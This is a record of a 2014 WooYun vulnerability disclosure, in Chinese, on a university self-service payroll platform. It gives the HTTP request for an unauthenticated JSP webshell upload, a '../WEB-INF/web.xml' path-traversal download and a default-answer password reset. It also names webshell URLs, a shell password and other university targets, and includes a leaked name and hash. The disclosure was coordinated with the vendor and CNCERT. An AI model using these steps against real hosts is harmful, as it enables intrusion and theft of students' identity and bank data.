{"id": 45588, "wybug_id": "wooyun-2014-087767", "wybug_title": "某网上自助平台通用型漏洞打包", "wybug_corp": "天津神州浩天科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-12-19 13:11", "wybug_open_date": "2015-03-19 13:12", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "任意文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： 今天学习的内容如下：1#任意重置密码2#前台无限制任意文件上传3#任意文件下载4#某处功能设计不当，导致大量用户敏感信息泄漏 详细说明：  系统名称：网上自助平台/网上申报管理系统/薪酬申报管理系统，但源码是同一套的。关键字：gxwssb、大学网上自助平台备注一下：该系统目前大部分运用在高校内网，外网案例较少1#任意重置密码以厦门理工学院为例http://58.199.193.57:8080/gxwssb/，通过贴吧获得某人学号（12******15），点击忘记密码（部分版本没有忘记密码这个链接），在密码答案处，直接输入000000（000000是系统默认配置），点击确定，密码即被重置为学号\n\n\n\n而且，我们在找回密码的时候进行抓包可以发现，输入正确的学号后，不输入密码，直接点击找回密码，此时系统执行了一个查询操作，并直接把查询结果返回给了用户，包括疑似用户密码[upw]和密码问题答案[answer]\n�����/5/onResult������DSK��#+com.qx.pojo.SysqxUser\tmkdmyxdlbjadminnoStranswerissysadminuname\tsuid selectedissysadminStrjghadminnoemailywmkdmupwyxdlbjStrsqrtelquestion10000000 黄江涛 12*******50,123@edu.cn A949943C5********DEC85CAA30C0BF *Bt��v���!��`n��H�U�Kŧ�!���;�R'r_�ק=!T?̇�kv�]����\n虽然有点乱码，但勉强看得懂\n\n之后通过重置好的密码，成功登录系统。2#前台无限制任意文件上传登录系统后，虽然学生没有录入的权限，但没关系，神奇的程序员没有对导入功能做权限判断\n\n导入excel，抓包分析\n\n\n\n虽然会提示个空指针错误（也许是因为我excel内容空的原因，没关系，操作继续），可以看到,返回上传成功的信息，以及关键的上传路径。\nsuccess,C:\\Program Files\\Apache Software Foundation\\Tomcat 5.5\\webapps\\gxwssb\\sjwj\\6129test.xls\n稍微修改一下包里的test.xls内容\nPOST http://58.199.193.57:8080/gxwssb/addhunansjwj?filename=6129test.xls HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------gL6ae0cH2Ij5KM7cH2GI3ei4Ij5ei4User-Agent: Shockwave FlashHost: 58.199.193.57:8080Content-Length: 425Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=7227BF80C9670870180708A1E0D7892B------------gL6ae0cH2Ij5KM7cH2GI3ei4Ij5ei4Content-Disposition: form-data; name=\"Filename\"test.xls------------gL6ae0cH2Ij5KM7cH2GI3ei4Ij5ei4Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.xls\"Content-Type: application/octet-streamwooyun test------------gL6ae0cH2Ij5KM7cH2GI3ei4Ij5ei4Content-Disposition: form-data; name=\"Upload\"Submit Query------------gL6ae0cH2Ij5KM7cH2GI3ei4Ij5ei4--\n我们可以通过修改filename=6129test.xls来达到上传jsp的效果http://58.199.193.57:8080/gxwssb/addhunansjwj?filename=wooyun.jsp\n\nhttp://58.199.193.57:8080/gxwssb/sjwj/wooyun.jsp\n\n事情到这里，当然不回结束，我们试试把cookie清了再上传\n\n\n\n美好的事情发生了，无须登录，前台getshell一句话地址：http://58.199.193.57:8080/gxwssb/sjwj/7348test.jsp密码：sqzr\n\n当然，目录里有许多的敏感信息，都是钱钱钱，我喜欢，话说老师工资好高3#任意文件下载既然有录入，那肯定就有导出了，点击学生模板导出，抓包\n\n注销用户后\nhttp://58.199.193.57:8080/gxwssb/fileDownloadmodel?name=../WEB-INF/web.xml\n清cookie\n\n4#某处功能设计不当，导致大量用户敏感信息泄漏虽然我只是一个学生帐号登录，但我可以做的比想象的多，在批量录入帮助中\n\n\n\n通过抓包，可以获取到所选取的班级的所有童鞋的身份证号、学号、银行卡，全校失身啊.\n\n这是多么痛的领悟   漏洞证明：  提供另外几个外网案例http://219.243.39.184:8080/gxwssb 天津大学网上自助平台http://lwsb.njau.edu.cn/gxwssb/    南京农业大学网上自助平台http://jcc.fafu.edu.cn:8080/gxwssb/   福建农林大学网上自助平台http://jccids.chd.edu.cn:8080/gxwssb/SJZX.html   长安大学网上自助平台http://cwsb.swu.edu.cn/gxwssb/SJZX.html   西南大学网上自助平台http://lwsb.njau.edu.cn/gxwssb/sjwj/wooyun.jsphttp://jcc.fafu.edu.cn:8080/gxwssb/sjwj/wooyun.jsphttp://219.243.39.184:8080/gxwssb/sjwj/wooyun.jsphttp://jccids.chd.edu.cn:8080/gxwssb/sjwj/wooyun.jsphttp://cwsb.swu.edu.cn/gxwssb/sjwj/wooyun.jsp\n\n大部分的案例都在校园网   修复方案：  加强权限控制修改对应的问题代码   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-24 08:41 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}